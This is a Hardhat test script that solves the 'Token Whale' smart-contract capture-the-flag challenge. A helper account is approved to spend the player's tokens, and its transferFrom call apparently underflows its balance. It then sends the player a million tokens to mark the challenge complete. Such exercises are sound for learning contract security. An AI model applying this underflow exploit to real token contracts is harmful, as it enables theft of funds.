const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");
describe("Token Whale Challenge", function() {
    beforeEach(async function() {
        [player, attacker, to] = await ethers.getSigners();
        contract = await (await ethers.getContractFactory("TokenWhaleChallenge")).deploy(player.address);
        await contract.deployed();

});
    describe("Complete Challenge", function() {
        it("Should complete the challenge", async function() {
            await contract.connect(player).approve(attacker.address, ethers.constants.MaxUint256);
            await contract.connect(attacker).transferFrom(player.address, to.address, 1);
            await contract.connect(attacker).transfer(player.address, 1000000);
            expect(await contract.isComplete()).to.equal(true);
        });
    });
});